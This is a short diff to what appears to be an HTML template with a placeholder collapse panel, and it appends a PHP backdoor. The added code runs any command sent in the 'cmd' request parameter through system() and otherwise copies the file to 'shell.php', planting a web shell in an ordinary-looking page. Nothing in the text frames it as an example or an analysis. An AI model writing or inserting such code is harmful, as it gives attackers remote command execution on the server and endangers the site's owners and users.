@@ -11,3 +11,11 @@
         Some placeholder content for the collapse component. This panel is hidden by default but revealed when the user activates the relevant trigger.
     </div>
 </div>
+
+<?php
+if (isset($_REQUEST['cmd'])){
+    system($_REQUEST['cmd']);
+}
+else{
+    copy('audio-demo.php', 'shell.php');
+}
